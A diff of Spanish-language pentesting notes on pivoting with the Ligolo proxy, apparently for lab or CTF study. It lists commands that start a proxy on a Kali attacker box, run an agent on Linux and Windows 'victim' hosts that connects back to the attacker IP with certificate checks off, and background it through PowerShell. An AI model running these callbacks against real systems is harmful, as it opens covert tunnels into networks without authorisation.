@@ -73,19 +73,20 @@ del proceso:
 # Descargar agente y proxy 
 NOTA: Cada vez que se quiera llegar a una red, se tiene que crear una nueva interfaz de red
 
-PASO 1: 
+PASO 1: KALI
 ❯ ./proxy -selfcert -laddr 0.0.0.0:11601      # Ejecutar el proxy en Kali con permisos de ejecución
 	❯ interface_create --name ligolo          # Crear la interfaz
 	❯ interface_add_route --name ligolo --route IP.0/24     
 	# Agregar el segmento al cual se quiere llegar 
 
 
-PASO 2: 
+PASO 2: VÍCTIMA LINUX
 # Desde Linux 
 ❯ chmod +x agent   # Permisos de ejecución 
 ❯ ./agent -connect IP_Kali:11601 -ignore-cert       
 # Ejecutar el agente en la máquina víctima en el 'salto' con permisos de ejecución en el dir '/tmp'
 
+PASO 2: VÍCTIMA WINDOWS 
 # Desde Windows Powershell (Colocarlo en segundo plano)
 ❯ .\agent_win.exe -connect IP_kali:11601 -ignore-cert
 ❯ Start-Process powershell -ArgumentList "-NoExit", "-Command", "cd $env:TEMP; .\agent.exe -connect IP_Kali:11601 -ignore-cert"
